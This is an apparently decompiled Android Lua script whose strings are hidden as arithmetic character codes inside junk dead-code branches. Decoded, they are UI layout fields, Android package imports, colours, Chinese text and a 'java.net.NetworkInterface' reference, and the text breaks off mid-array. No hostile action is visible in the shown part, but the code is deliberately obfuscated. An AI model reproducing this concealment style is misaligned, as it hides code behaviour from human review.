local L0_213, L5_214, L40_215, L41_216, L42_217, L43_218, L44_219, L45_220, L46_221, L47_222, L48_223, L49_224, L50_225, L51_226, L52_227, L54_228, L55_229, L56_230, L57_231, L58_232, L63_233, L64_234, L65_235, L66_236, L67_237, L68_238, L69_239, L70_240, L71_241, L76_242, L77_243, L78_244, L79_245, L80_246, L81_247, L82_248, L83_249, L84_250, L89_251, L90_252, L91_253, L92_254, L93_255, L94_256, L95_257, L96_258, L97_259, L102_260, L103_261, L104_262, L105_263, L106_264, L107_265, L108_266, L109_267, L110_268, L115_269, L116_270, L117_271, L118_272, L119_273, L120_274, L121_275, L122_276, L123_277, L128_278, L129_279, L130_280, L131_281, L132_282, L133_283, L134_284, L135_285, L136_286, L138_287, L139_288, L140_289, L141_290, L142_291, L143_292
L0_213 = _ENV
L5_214 = L0_213.string
L5_214 = L5_214.char
L40_215 = L0_213.table
L40_215 = L40_215.unpack
L41_216 = 68154
L42_217 = L41_216 + 51961
function L43_218()
  local L0_293, L1_294
  L0_293 = L0_213
  L1_294 = nil
  if L1_294 then
  end
  if 717 < -767 then
  end
  L1_294 = nil
  if L1_294 then
    repeat
      repeat
        do break end
        break
      until true
      L1_294 = nil
      if L1_294 then
      else
      end
    until true
  else
  end
  L1_294 = L5_214
  L1_294 = L1_294(L40_215({
    L42_217 - 120083,
    L42_217 - 119992,
    L42_217 - 120105,
    L42_217 - 120083,
    L42_217 - 120083,
    L42_217 - 120083,
    L42_217 - 120083,
    L42_217 - 120031,
    L42_217 - 120014,
    L42_217 - 119995,
    L42_217 - 119999,
    L42_217 - 120029,
    L42_217 - 120010,
    L42_217 - 120014,
    L42_217 - 119996,
    L42_217 - 120056,
    L42_217 - 120105,
    L42_217 - 120083,
    L42_217 - 120083,
    L42_217 - 120083,
    L42_217 - 120083,
    L42_217 - 119999,
    L42_217 - 120014,
    L42_217 - 119995,
    L42_217 - 119999,
    L42_217 - 120032,
    L42_217 - 120010,
    L42_217 - 119993,
    L42_217 - 120014,
    L42_217 - 120054,
    L42_217 - 120081,
    L42_217 - 120065,
    L42_217 - 120067,
    L42_217 - 120000,
    L42_217 - 120003,
    L42_217 - 120081,
    L42_217 - 120056,
    L42_217 - 120105,
    L42_217 - 120083,
    L42_217 - 120083,
    L42_217 - 120083,
    L42_217 - 120083,
    L42_217 - 120007,
    L42_217 - 120018,
    L42_217 - 119994,
    L42_217 - 120004,
    L42_217 - 119998,
    L42_217 - 119999,
    L42_217 - 120020,
    L42_217 - 120006,
    L42_217 - 120018,
    L42_217 - 120001,
    L42_217 - 120012,
    L42_217 - 120010,
    L42_217 - 120005,
    L42_217 - 120031,
    L42_217 - 120004,
    L42_217 - 120003,
    L42_217 - 120054,
    L42_217 - 120081,
    L42_217 - 120066,
    L42_217 - 120067,
    L42_217 - 120078,
    L42_217 - 120011,
    L42_217 - 120081,
    L42_217 - 120056,
    L42_217 - 120105,
    L42_217 - 120083,
    L42_217 - 120083,
    L42_217 - 120083,
    L42_217 - 120083,
    L42_217 - 120007,
    L42_217 - 120018,
    L42_217 - 119994,
    L42_217 - 120004,
    L42_217 - 119998,
    L42_217 - 119999,
    L42_217 - 120020,
    L42_217 - 120011,
    L42_217 - 120014,
    L42_217 - 120010,
    L42_217 - 120012,
    L42_217 - 120011,
    L42_217 - 119999,
    L42_217 - 120054,
    L42_217 - 120081,
    L42_217 - 120063,
    L42_217 - 120067,
    L42_217 - 120015,
    L42_217 - 120003,
    L42_217 - 120081,
    L42_217 - 120056,
    L42_217 - 120105,
    L42_217 - 120083,
    L42_217 - 120083,
    L42_217 - 120083,
    L42_217 - 120083,
    L42_217 - 119999,
    L42_217 - 120014,
    L42_217 - 119995,
    L42_217 - 119999,
    L42_217 - 120048,
    L42_217 - 120004,
    L42_217 - 120007,
    L42_217 - 120004,
    L42_217 - 120001,
    L42_217 - 120054,
    L42_217 - 120081,
    L42_217 - 120080,
    L42_217 - 120058,
    L42_217 - 120047,
    L42_217 - 120067,
    L42_217 - 120067,
    L42_217 - 120067,
    L42_217 - 120067,
    L42_217 - 120067,
    L42_217 - 120067,
    L42_217 - 120081,
    L42_217 - 120056,
    L42_217 - 120105,
    L42_217 - 120083,
    L42_217 - 120083,
    L42_217 - 120083,
    L42_217 - 120083,
    L42_217 - 120007,
    L42_217 - 120018,
    L42_217 - 119994,
    L42_217 - 120004,
    L42_217 - 119998,
    L42_217 - 119999,
    L42_217 - 120020,
    L42_217 - 119996,
    L42_217 - 120010,
    L42_217 - 120015,
    L42_217 - 119999,
    L42_217 - 120011,
    L42_217 - 120054,
    L42_217 - 120081,
    L42_217 - 120013,
    L42_217 - 120010,
    L42_217 - 120007,
    L42_217 - 120007,
    L42_217 - 120081,
    L42_217 - 120056,
    L42_217 - 120105,
    L42_217 - 120083,
    L42_217 - 120083,
    L42_217 - 120083,
    L42_217 - 120083,
    L42_217 - 120012,
    L42_217 - 120001,
    L42_217 - 120018,
    L42_217 - 119997,
    L42_217 - 120010,
    L42_217 - 119999,
    L42_217 - 119994,
    L42_217 - 120054,
    L42_217 - 120081,
    L42_217 - 120016,
    L42_217 - 120014,
    L42_217 - 120005,
    L42_217 - 119999,
    L42_217 - 120014,
    L42_217 - 120001,
    L42_217 - 120081,
    L42_217 - 120056,
    L42_217 - 120105,
    L42_217 - 120083,
    L42_217 - 120083,
    L42_217 - 120083,
    L42_217 - 120083,
    L42_217 - 120010,
    L42_217 - 120015,
    L42_217 - 120054,
    L42_217 - 120081,
    L42_217 - 119887,
    L42_217 - 119931,
    L42_217 - 119928,
    L42_217 - 119882,
    L42_217 - 119954,
    L42_217 - 119934,
    L42_217 - 119885,
    L42_217 - 119955,
    L42_217 - 119980,
    L42_217 - 119882,
    L42_217 - 119953,
    L42_217 - 119963,
    L42_217 - 120081,
    L42_217 - 120056,
    L42_217 - 120105,
    L42_217 - 120083,
    L42_217 - 120083,
    L42_217 - 120083,
    L42_217 - 120083,
    L42_217 - 119999,
    L42_217 - 120014,
    L42_217 - 119995,
    L42_217 - 119999,
    L42_217 - 120054,
    L42_217 - 120081,
    L42_217 - 120037,
    L42_217 - 120004,
    L42_217 - 120011,
    L42_217 - 120018,
    L42_217 - 120001,
    L42_217 - 120018,
    L42_217 - 120083,
    L42_217 - 120031,
    L42_217 - 120004,
    L42_217 - 120004,
    L42_217 - 120007,
    L42_217 - 120083,
    L42_217 - 120017,
    L42_217 - 120004,
    L42_217 - 119995,
    L42_217 - 120081,
    L42_217 - 120056,
    L42_217 - 120105,
    L42_217 - 120083,
    L42_217 - 120083,
    L42_217 - 119990,
    L42_217 - 120056
  }))
  return L1_294
end

function L44_219()
  local L0_295, L1_296
  L0_295 = L0_213
  L1_296 = nil
  if L1_296 then
  end
  if 717 < -767 then
  end
  L1_296 = nil
  if L1_296 then
    repeat
      repeat
        do break end
        break
      until true
      L1_296 = nil
      if L1_296 then
      else
      end
    until true
  else
  end
  L1_296 = L5_214
  L1_296 = L1_296(L40_215({
    L42_217 - 120010,
    L42_217 - 120006,
    L42_217 - 120003,
    L42_217 - 120004,
    L42_217 - 120001,
    L42_217 - 119999
  }))
  return L1_296
end

function L45_220()
  local L0_297, L1_298
  L0_297 = L0_213
  L1_298 = nil
  if L1_298 then
  end
  if 717 < -767 then
  end
  L1_298 = nil
  if L1_298 then
    repeat
      repeat
        do break end
        break
      until true
      L1_298 = nil
      if L1_298 then
      else
      end
    until true
  else
  end
  L1_298 = L5_214
  L1_298 = L1_298(L40_215({
    L42_217 - 120018,
    L42_217 - 120005,
    L42_217 - 120015,
    L42_217 - 120001,
    L42_217 - 120004,
    L42_217 - 120010,
    L42_217 - 120015,
    L42_217 - 120069,
    L42_217 - 120018,
    L42_217 - 120003,
    L42_217 - 120003,
    L42_217 - 120069,
    L42_217 - 120073
  }))
  return L1_298
end

function L46_221()
  local L0_299, L1_300
  L0_299 = L0_213
  L1_300 = nil
  if L1_300 then
  end
  if 717 < -767 then
  end
  L1_300 = nil
  if L1_300 then
    repeat
      repeat
        do break end
        break
      until true
      L1_300 = nil
      if L1_300 then
      else
      end
    until true
  else
  end
  L1_300 = L5_214
  L1_300 = L1_300(L40_215({
    L42_217 - 120018,
    L42_217 - 120005,
    L42_217 - 120015,
    L42_217 - 120001,
    L42_217 - 120004,
    L42_217 - 120010,
    L42_217 - 120015,
    L42_217 - 120069,
    L42_217 - 120004,
    L42_217 - 120000,
    L42_217 - 120069,
    L42_217 - 120073
  }))
  return L1_300
end

function L47_222()
  local L0_301, L1_302
  L0_301 = L0_213
  L1_302 = nil
  if L1_302 then
  end
  if 717 < -767 then
  end
  L1_302 = nil
  if L1_302 then
    repeat
      repeat
        do break end
        break
      until true
      L1_302 = nil
      if L1_302 then
      else
      end
    until true
  else
  end
  L1_302 = L5_214
  L1_302 = L1_302(L40_215({
    L42_217 - 120018,
    L42_217 - 120005,
    L42_217 - 120015,
    L42_217 - 120001,
    L42_217 - 120004,
    L42_217 - 120010,
    L42_217 - 120015,
    L42_217 - 120069,
    L42_217 - 119996,
    L42_217 - 120010,
    L42_217 - 120015,
    L42_217 - 120012,
    L42_217 - 120014,
    L42_217 - 119999,
    L42_217 - 120069,
    L42_217 - 120073
  }))
  return L1_302
end

function L48_223()
  local L0_303, L1_304
  L0_303 = L0_213
  L1_304 = nil
  if L1_304 then
  end
  if 717 < -767 then
  end
  L1_304 = nil
  if L1_304 then
    repeat
      repeat
        do break end
        break
      until true
      L1_304 = nil
      if L1_304 then
      else
      end
    until true
  else
  end
  L1_304 = L5_214
  L1_304 = L1_304(L40_215({
    L42_217 - 120018,
    L42_217 - 120005,
    L42_217 - 120015,
    L42_217 - 120001,
    L42_217 - 120004,
    L42_217 - 120010,
    L42_217 - 120015,
    L42_217 - 120069,
    L42_217 - 119997,
    L42_217 - 120010,
    L42_217 - 120014,
    L42_217 - 119996,
    L42_217 - 120069,
    L42_217 - 120073
  }))
  return L1_304
end

function L49_224()
  local L0_305, L1_306
  L0_305 = L0_213
  L1_306 = nil
  if L1_306 then
  end
  if 717 < -767 then
  end
  L1_306 = nil
  if L1_306 then
    repeat
      repeat
        do break end
        break
      until true
      L1_306 = nil
      if L1_306 then
      else
      end
    until true
  else
  end
  L1_306 = L5_214
  L1_306 = L1_306(L40_215({
    L42_217 - 120018,
    L42_217 - 120005,
    L42_217 - 120015,
    L42_217 - 120001,
    L42_217 - 120004,
    L42_217 - 120010,
    L42_217 - 120015,
    L42_217 - 120069,
    L42_217 - 120005,
    L42_217 - 120014,
    L42_217 - 119999,
    L42_217 - 120069,
    L42_217 - 120030,
    L42_217 - 120001,
    L42_217 - 120010
  }))
  return L1_306
end

function L50_225()
  local L0_307, L1_308
  L0_307 = L0_213
  L1_308 = nil
  if L1_308 then
  end
  if 717 < -767 then
  end
  L1_308 = nil
  if L1_308 then
    repeat
      repeat
        do break end
        break
      until true
      L1_308 = nil
      if L1_308 then
      else
      end
    until true
  else
  end
  L1_308 = L5_214
  L1_308 = L1_308(L40_215({
    L42_217 - 120016,
    L42_217 - 120014,
    L42_217 - 120005,
    L42_217 - 119999,
    L42_217 - 120014,
    L42_217 - 120001
  }))
  return L1_308
end

function L51_226()
  local L0_309, L1_310
  L0_309 = L0_213
  L1_310 = nil
  if L1_310 then
  end
  if 717 < -767 then
  end
  L1_310 = nil
  if L1_310 then
    repeat
      repeat
        do break end
        break
      until true
      L1_310 = nil
      if L1_310 then
      else
      end
    until true
  else
  end
  L1_310 = L5_214
  L1_310 = L1_310(L40_215({
    L42_217 - 120016,
    L42_217 - 120014,
    L42_217 - 120005,
    L42_217 - 119999,
    L42_217 - 120014,
    L42_217 - 120001
  }))
  return L1_310
end

function L52_227()
  local L0_311, L1_312
  L0_311 = L0_213
  L1_312 = nil
  if L1_312 then
  end
  if 717 < -767 then
  end
  L1_312 = nil
  if L1_312 then
    repeat
      repeat
        do break end
        break
      until true
      L1_312 = nil
      if L1_312 then
      else
      end
    until true
  else
  end
  L1_312 = L5_214
  L1_312 = L1_312(L40_215({
    L42_217 - 119996,
    L42_217 - 120001,
    L42_217 - 120018,
    L42_217 - 120003
  }))
  return L1_312
end

function L54_228()
  local L0_313, L1_314
  L0_313 = L0_213
  L1_314 = nil
  if L1_314 then
  end
  if 717 < -767 then
  end
  L1_314 = nil
  if L1_314 then
    repeat
      repeat
        do break end
        break
      until true
      L1_314 = nil
      if L1_314 then
      else
      end
    until true
  else
  end
  L1_314 = L5_214
  L1_314 = L1_314(L40_215({
    L42_217 - 120013,
    L42_217 - 120010,
    L42_217 - 120007,
    L42_217 - 120007
  }))
  return L1_314
end

function L55_229()
  local L0_315, L1_316
  L0_315 = L0_213
  L1_316 = nil
  if L1_316 then
  end
  if 717 < -767 then
  end
  L1_316 = nil
  if L1_316 then
    repeat
      repeat
        do break end
        break
      until true
      L1_316 = nil
      if L1_316 then
      else
      end
    until true
  else
  end
  L1_316 = L5_214
  L1_316 = L1_316(L40_215({
    L42_217 - 119997,
    L42_217 - 120014,
    L42_217 - 120001,
    L42_217 - 119999,
    L42_217 - 120010,
    L42_217 - 120016,
    L42_217 - 120018,
    L42_217 - 120007
  }))
  return L1_316
end

function L56_230()
  local L0_317, L1_318
  L0_317 = L0_213
  L1_318 = nil
  if L1_318 then
  end
  if 717 < -767 then
  end
  L1_318 = nil
  if L1_318 then
    repeat
      repeat
        do break end
        break
      until true
      L1_318 = nil
      if L1_318 then
      else
      end
    until true
  else
  end
  L1_318 = L5_214
  L1_318 = L1_318(L40_215({
    L42_217 - 120066,
    L42_217 - 120067,
    L42_217 - 120078,
    L42_217 - 120011
  }))
  return L1_318
end

function L57_231()
  local L0_319, L1_320
  L0_319 = L0_213
  L1_320 = nil
  if L1_320 then
  end
  if 717 < -767 then
  end
  L1_320 = nil
  if L1_320 then
    repeat
      repeat
        do break end
        break
      until true
      L1_320 = nil
      if L1_320 then
      else
      end
    until true
  else
  end
  L1_320 = L5_214
  L1_320 = L1_320(L40_215({
    L42_217 - 120012
  }))
  return L1_320
end

function L58_232()
  local L0_321, L1_322
  L0_321 = L0_213
  L1_322 = nil
  if L1_322 then
  end
  if 717 < -767 then
  end
  L1_322 = nil
  if L1_322 then
    repeat
      repeat
        do break end
        break
      until true
      L1_322 = nil
      if L1_322 then
      else
      end
    until true
  else
  end
  L1_322 = L5_214
  L1_322 = L1_322(L40_215({
    L42_217 - 120067,
    L42_217 - 119995,
    L42_217 - 120045,
    L42_217 - 120045,
    L42_217 - 120045,
    L42_217 - 120045,
    L42_217 - 120062,
    L42_217 - 120049,
    L42_217 - 120067,
    L42_217 - 120067
  }))
  return L1_322
end

function L63_233()
  local L0_323, L1_324
  L0_323 = L0_213
  L1_324 = nil
  if L1_324 then
  end
  if 717 < -767 then
  end
  L1_324 = nil
  if L1_324 then
    repeat
      repeat
        do break end
        break
      until true
      L1_324 = nil
      if L1_324 then
      else
      end
    until true
  else
  end
  L1_324 = L5_214
  L1_324 = L1_324(L40_215({
    L42_217 - 120067,
    L42_217 - 120015,
    L42_217 - 120003
  }))
  return L1_324
end

function L64_234()
  local L0_325, L1_326
  L0_325 = L0_213
  L1_326 = nil
  if L1_326 then
  end
  if 717 < -767 then
  end
  L1_326 = nil
  if L1_326 then
    repeat
      repeat
        do break end
        break
      until true
      L1_326 = nil
      if L1_326 then
      else
      end
    until true
  else
  end
  L1_326 = L5_214
  L1_326 = L1_326(L40_215({
    L42_217 - 120060,
    L42_217 - 120078,
    L42_217 - 120011
  }))
  return L1_326
end

function L65_235()
  local L0_327, L1_328
  L0_327 = L0_213
  L1_328 = nil
  if L1_328 then
  end
  if 717 < -767 then
  end
  L1_328 = nil
  if L1_328 then
    repeat
      repeat
        do break end
        break
      until true
      L1_328 = nil
      if L1_328 then
      else
      end
    until true
  else
  end
  L1_328 = L5_214
  L1_328 = L1_328(L40_215({
    L42_217 - 120060,
    L42_217 - 120078,
    L42_217 - 120011
  }))
  return L1_328
end

function L66_236()
  local L0_329, L1_330
  L0_329 = L0_213
  L1_330 = nil
  if L1_330 then
  end
  if 717 < -767 then
  end
  L1_330 = nil
  if L1_330 then
    repeat
      repeat
        do break end
        break
      until true
      L1_330 = nil
      if L1_330 then
      else
      end
    until true
  else
  end
  L1_330 = L5_214
  L1_330 = L1_330(L40_215({
    L42_217 - 120045,
    L42_217 - 120004,
    L42_217 - 120007,
    L42_217 - 120015,
    L42_217 - 120014,
    L42_217 - 120001,
    L42_217 - 120068,
    L42_217 - 120067,
    L42_217 - 120069,
    L42_217 - 120003,
    L42_217 - 120005,
    L42_217 - 120012
  }))
  return L1_330
end

function L67_237()
  local L0_331, L1_332
  L0_331 = L0_213
  L1_332 = nil
  if L1_332 then
  end
  if 717 < -767 then
  end
  L1_332 = nil
  if L1_332 then
    repeat
      repeat
        do break end
        break
      until true
      L1_332 = nil
      if L1_332 then
      else
      end
    until true
  else
  end
  L1_332 = L5_214
  L1_332 = L1_332(L40_215({
    L42_217 - 120066,
    L42_217 - 120067,
    L42_217 - 120000,
    L42_217 - 120003
  }))
  return L1_332
end

function L68_238()
  local L0_333, L1_334
  L0_333 = L0_213
  L1_334 = nil
  if L1_334 then
  end
  if 717 < -767 then
  end
  L1_334 = nil
  if L1_334 then
    repeat
      repeat
        do break end
        break
      until true
      L1_334 = nil
      if L1_334 then
      else
      end
    until true
  else
  end
  L1_334 = L5_214
  L1_334 = L1_334(L40_215({
    L42_217 - 120070,
    L42_217 - 120067,
    L42_217 - 120069,
    L42_217 - 120063,
    L42_217 - 120078,
    L42_217 - 120011
  }))
  return L1_334
end

function L69_239()
  local L0_335, L1_336
  L0_335 = L0_213
  L1_336 = nil
  if L1_336 then
  end
  if 717 < -767 then
  end
  L1_336 = nil
  if L1_336 then
    repeat
      repeat
        do break end
        break
      until true
      L1_336 = nil
      if L1_336 then
      else
      end
    until true
  else
  end
  L1_336 = L5_214
  L1_336 = L1_336(L40_215({
    L42_217 - 120062,
    L42_217 - 120067,
    L42_217 - 120015,
    L42_217 - 120003
  }))
  return L1_336
end

function L70_240()
  local L0_337, L1_338
  L0_337 = L0_213
  L1_338 = nil
  if L1_338 then
  end
  if 717 < -767 then
  end
  L1_338 = nil
  if L1_338 then
    repeat
      repeat
        do break end
        break
      until true
      L1_338 = nil
      if L1_338 then
      else
      end
    until true
  else
  end
  L1_338 = L5_214
  L1_338 = L1_338(L40_215({
    L42_217 - 120080,
    L42_217 - 120045,
    L42_217 - 120045,
    L42_217 - 120045,
    L42_217 - 120045,
    L42_217 - 120062,
    L42_217 - 120049,
    L42_217 - 120067,
    L42_217 - 120067
  }))
  return L1_338
end

function L71_241()
  local L0_339, L1_340
  L0_339 = L0_213
  L1_340 = nil
  if L1_340 then
  end
  if 717 < -767 then
  end
  L1_340 = nil
  if L1_340 then
    repeat
      repeat
        do break end
        break
      until true
      L1_340 = nil
      if L1_340 then
      else
      end
    until true
  else
  end
  L1_340 = L5_214
  L1_340 = L1_340(L40_215({
    L42_217 - 120013,
    L42_217 - 120010,
    L42_217 - 120007,
    L42_217 - 120007
  }))
  return L1_340
end

function L76_242()
  local L0_341, L1_342
  L0_341 = L0_213
  L1_342 = nil
  if L1_342 then
  end
  if 717 < -767 then
  end
  L1_342 = nil
  if L1_342 then
    repeat
      repeat
        do break end
        break
      until true
      L1_342 = nil
      if L1_342 then
      else
      end
    until true
  else
  end
  L1_342 = L5_214
  L1_342 = L1_342(L40_215({
    L42_217 - 120016,
    L42_217 - 120014,
    L42_217 - 120005,
    L42_217 - 119999,
    L42_217 - 120014,
    L42_217 - 120001
  }))
  return L1_342
end

function L77_243()
  local L0_343, L1_344
  L0_343 = L0_213
  L1_344 = nil
  if L1_344 then
  end
  if 717 < -767 then
  end
  L1_344 = nil
  if L1_344 then
    repeat
      repeat
        do break end
        break
      until true
      L1_344 = nil
      if L1_344 then
      else
      end
    until true
  else
  end
  L1_344 = L5_214
  L1_344 = L1_344(L40_215({
    L42_217 - 119883,
    L42_217 - 119926,
    L42_217 - 119940,
    L42_217 - 119887,
    L42_217 - 119928,
    L42_217 - 119933,
    L42_217 - 119882,
    L42_217 - 119954,
    L42_217 - 119934,
    L42_217 - 119882,
    L42_217 - 119958,
    L42_217 - 119953,
    L42_217 - 119886,
    L42_217 - 119977,
    L42_217 - 119955,
    L42_217 - 119883,
    L42_217 - 119926,
    L42_217 - 119926,
    L42_217 - 119887,
    L42_217 - 119931,
    L42_217 - 119942
  }))
  return L1_344
end

function L78_244()
  local L0_345, L1_346
  L0_345 = L0_213
  L1_346 = nil
  if L1_346 then
  end
  if 717 < -767 then
  end
  L1_346 = nil
  if L1_346 then
    repeat
      repeat
        do break end
        break
      until true
      L1_346 = nil
      if L1_346 then
      else
      end
    until true
  else
  end
  L1_346 = L5_214
  L1_346 = L1_346(L40_215({
    L42_217 - 120002,
    L42_217 - 120015,
    L42_217 - 119993,
    L42_217 - 119999
  }))
  return L1_346
end

function L79_245()
  local L0_347, L1_348
  L0_347 = L0_213
  L1_348 = nil
  if L1_348 then
  end
  if 717 < -767 then
  end
  L1_348 = nil
  if L1_348 then
    repeat
      repeat
        do break end
        break
      until true
      L1_348 = nil
      if L1_348 then
      else
      end
    until true
  else
  end
  L1_348 = L5_214
  L1_348 = L1_348(L40_215({
    L42_217 - 120066,
    L42_217 - 120078,
    L42_217 - 120011
  }))
  return L1_348
end

function L80_246()
  local L0_349, L1_350
  L0_349 = L0_213
  L1_350 = nil
  if L1_350 then
  end
  if 717 < -767 then
  end
  L1_350 = nil
  if L1_350 then
    repeat
      repeat
        do break end
        break
      until true
      L1_350 = nil
      if L1_350 then
      else
      end
    until true
  else
  end
  L1_350 = L5_214
  L1_350 = L1_350(L40_215({
    L42_217 - 120066,
    L42_217 - 120078,
    L42_217 - 120011
  }))
  return L1_350
end

function L81_247()
  local L0_351, L1_352
  L0_351 = L0_213
  L1_352 = nil
  if L1_352 then
  end
  if 717 < -767 then
  end
  L1_352 = nil
  if L1_352 then
    repeat
      repeat
        do break end
        break
      until true
      L1_352 = nil
      if L1_352 then
      else
      end
    until true
  else
  end
  L1_352 = L5_214
  L1_352 = L1_352(L40_215({
    L42_217 - 120016,
    L42_217 - 120014,
    L42_217 - 120005,
    L42_217 - 119999,
    L42_217 - 120014,
    L42_217 - 120001
  }))
  return L1_352
end

function L82_248()
  local L0_353, L1_354
  L0_353 = L0_213
  L1_354 = nil
  if L1_354 then
  end
  if 717 < -767 then
  end
  L1_354 = nil
  if L1_354 then
    repeat
      repeat
        do break end
        break
      until true
      L1_354 = nil
      if L1_354 then
      else
      end
    until true
  else
  end
  L1_354 = L5_214
  L1_354 = L1_354(L40_215({
    L42_217 - 120065,
    L42_217 - 120067,
    L42_217 - 120015,
    L42_217 - 120003
  }))
  return L1_354
end

function L83_249()
  local L0_355, L1_356
  L0_355 = L0_213
  L1_356 = nil
  if L1_356 then
  end
  if 717 < -767 then
  end
  L1_356 = nil
  if L1_356 then
    repeat
      repeat
        do break end
        break
      until true
      L1_356 = nil
      if L1_356 then
      else
      end
    until true
  else
  end
  L1_356 = L5_214
  L1_356 = L1_356(L40_215({
    L42_217 - 120009,
    L42_217 - 120015,
    L42_217 - 119997
  }))
  return L1_356
end

function L84_250()
  local L0_357, L1_358
  L0_357 = L0_213
  L1_358 = nil
  if L1_358 then
  end
  if 717 < -767 then
  end
  L1_358 = nil
  if L1_358 then
    repeat
      repeat
        do break end
        break
      until true
      L1_358 = nil
      if L1_358 then
      else
      end
    until true
  else
  end
  L1_358 = L5_214
  L1_358 = L1_358(L40_215({
    L42_217 - 120080,
    L42_217 - 120061,
    L42_217 - 120060,
    L42_217 - 120047,
    L42_217 - 120062,
    L42_217 - 120049,
    L42_217 - 120062
  }))
  return L1_358
end

function L89_251()
  local L0_359, L1_360
  L0_359 = L0_213
  L1_360 = nil
  if L1_360 then
  end
  if 717 < -767 then
  end
  L1_360 = nil
  if L1_360 then
    repeat
      repeat
        do break end
        break
      until true
      L1_360 = nil
      if L1_360 then
      else
      end
    until true
  else
  end
  L1_360 = L5_214
  L1_360 = L1_360(L40_215({
    L42_217 - 120009,
    L42_217 - 120015
  }))
  return L1_360
end

function L90_252()
  local L0_361, L1_362
  L0_361 = L0_213
  L1_362 = nil
  if L1_362 then
  end
  if 717 < -767 then
  end
  L1_362 = nil
  if L1_362 then
    repeat
      repeat
        do break end
        break
      until true
      L1_362 = nil
      if L1_362 then
      else
      end
    until true
  else
  end
  L1_362 = L5_214
  L1_362 = L1_362(L40_215({
    L42_217 - 120018,
    L42_217 - 120005,
    L42_217 - 120015,
    L42_217 - 120001,
    L42_217 - 120004,
    L42_217 - 120010,
    L42_217 - 120015,
    L42_217 - 120069,
    L42_217 - 120012,
    L42_217 - 120001,
    L42_217 - 120018,
    L42_217 - 120003,
    L42_217 - 120011,
    L42_217 - 120010,
    L42_217 - 120016,
    L42_217 - 120000,
    L42_217 - 120069,
    L42_217 - 120035,
    L42_217 - 120018,
    L42_217 - 120010,
    L42_217 - 120005,
    L42_217 - 119999
  }))
  return L1_362
end

function L91_253()
  local L0_363, L1_364
  L0_363 = L0_213
  L1_364 = nil
  if L1_364 then
  end
  if 717 < -767 then
  end
  L1_364 = nil
  if L1_364 then
    repeat
      repeat
        do break end
        break
      until true
      L1_364 = nil
      if L1_364 then
      else
      end
    until true
  else
  end
  L1_364 = L5_214
  L1_364 = L1_364(L40_215({
    L42_217 - 120045,
    L42_217 - 120004,
    L42_217 - 120007,
    L42_217 - 120015,
    L42_217 - 120014,
    L42_217 - 120001,
    L42_217 - 120068,
    L42_217 - 120066,
    L42_217 - 120069,
    L42_217 - 120003,
    L42_217 - 120005,
    L42_217 - 120012
  }))
  return L1_364
end

function L92_254()
  local L0_365, L1_366
  L0_365 = L0_213
  L1_366 = nil
  if L1_366 then
  end
  if 717 < -767 then
  end
  L1_366 = nil
  if L1_366 then
    repeat
      repeat
        do break end
        break
      until true
      L1_366 = nil
      if L1_366 then
      else
      end
    until true
  else
  end
  L1_366 = L5_214
  L1_366 = L1_366(L40_215({
    L42_217 - 120045,
    L42_217 - 120004,
    L42_217 - 120007,
    L42_217 - 120015,
    L42_217 - 120014,
    L42_217 - 120001,
    L42_217 - 120068,
    L42_217 - 120065,
    L42_217 - 120069,
    L42_217 - 120003,
    L42_217 - 120005,
    L42_217 - 120012
  }))
  return L1_366
end

function L93_255()
  local L0_367, L1_368
  L0_367 = L0_213
  L1_368 = nil
  if L1_368 then
  end
  if 717 < -767 then
  end
  L1_368 = nil
  if L1_368 then
    repeat
      repeat
        do break end
        break
      until true
      L1_368 = nil
      if L1_368 then
      else
      end
    until true
  else
  end
  L1_368 = L5_214
  L1_368 = L1_368(L40_215({
    L42_217 - 120045,
    L42_217 - 120004,
    L42_217 - 120007,
    L42_217 - 120015,
    L42_217 - 120014,
    L42_217 - 120001,
    L42_217 - 120068,
    L42_217 - 120064,
    L42_217 - 120069,
    L42_217 - 120003,
    L42_217 - 120005,
    L42_217 - 120012
  }))
  return L1_368
end

function L94_256()
  local L0_369, L1_370
  L0_369 = L0_213
  L1_370 = nil
  if L1_370 then
  end
  if 717 < -767 then
  end
  L1_370 = nil
  if L1_370 then
    repeat
      repeat
        do break end
        break
      until true
      L1_370 = nil
      if L1_370 then
      else
      end
    until true
  else
  end
  L1_370 = L5_214
  L1_370 = L1_370(L40_215({
    L42_217 - 120045,
    L42_217 - 120004,
    L42_217 - 120007,
    L42_217 - 120015,
    L42_217 - 120014,
    L42_217 - 120001,
    L42_217 - 120068,
    L42_217 - 120063,
    L42_217 - 120069,
    L42_217 - 120003,
    L42_217 - 120005,
    L42_217 - 120012
  }))
  return L1_370
end

function L95_257()
  local L0_371, L1_372
  L0_371 = L0_213
  L1_372 = nil
  if L1_372 then
  end
  if 717 < -767 then
  end
  L1_372 = nil
  if L1_372 then
    repeat
      repeat
        do break end
        break
      until true
      L1_372 = nil
      if L1_372 then
      else
      end
    until true
  else
  end
  L1_372 = L5_214
  L1_372 = L1_372(L40_215({
    L42_217 - 120045,
    L42_217 - 120004,
    L42_217 - 120007,
    L42_217 - 120015,
    L42_217 - 120014,
    L42_217 - 120001,
    L42_217 - 120068,
    L42_217 - 120062,
    L42_217 - 120069,
    L42_217 - 120003,
    L42_217 - 120005,
    L42_217 - 120012
  }))
  return L1_372
end

function L96_258()
  local L0_373, L1_374
  L0_373 = L0_213
  L1_374 = nil
  if L1_374 then
  end
  if 717 < -767 then
  end
  L1_374 = nil
  if L1_374 then
    repeat
      repeat
        do break end
        break
      until true
      L1_374 = nil
      if L1_374 then
      else
      end
    until true
  else
  end
  L1_374 = L5_214
  L1_374 = L1_374(L40_215({
    L42_217 - 120045,
    L42_217 - 120004,
    L42_217 - 120007,
    L42_217 - 120015,
    L42_217 - 120014,
    L42_217 - 120001,
    L42_217 - 120068,
    L42_217 - 120061,
    L42_217 - 120069,
    L42_217 - 120003,
    L42_217 - 120005,
    L42_217 - 120012
  }))
  return L1_374
end

function L97_259()
  local L0_375, L1_376
  L0_375 = L0_213
  L1_376 = nil
  if L1_376 then
  end
  if 717 < -767 then
  end
  L1_376 = nil
  if L1_376 then
    repeat
      repeat
        do break end
        break
      until true
      L1_376 = nil
      if L1_376 then
      else
      end
    until true
  else
  end
  L1_376 = L5_214
  L1_376 = L1_376(L40_215({
    L42_217 - 120009,
    L42_217 - 120018,
    L42_217 - 119997,
    L42_217 - 120018,
    L42_217 - 120069,
    L42_217 - 120005,
    L42_217 - 120014,
    L42_217 - 119999,
    L42_217 - 120069,
    L42_217 - 120037,
    L42_217 - 120014,
    L42_217 - 119999,
    L42_217 - 119996,
    L42_217 - 120004,
    L42_217 - 120001,
    L42_217 - 120008,
    L42_217 - 120042,
    L42_217 - 120005,
    L42_217 - 119999,
    L42_217 - 120014,
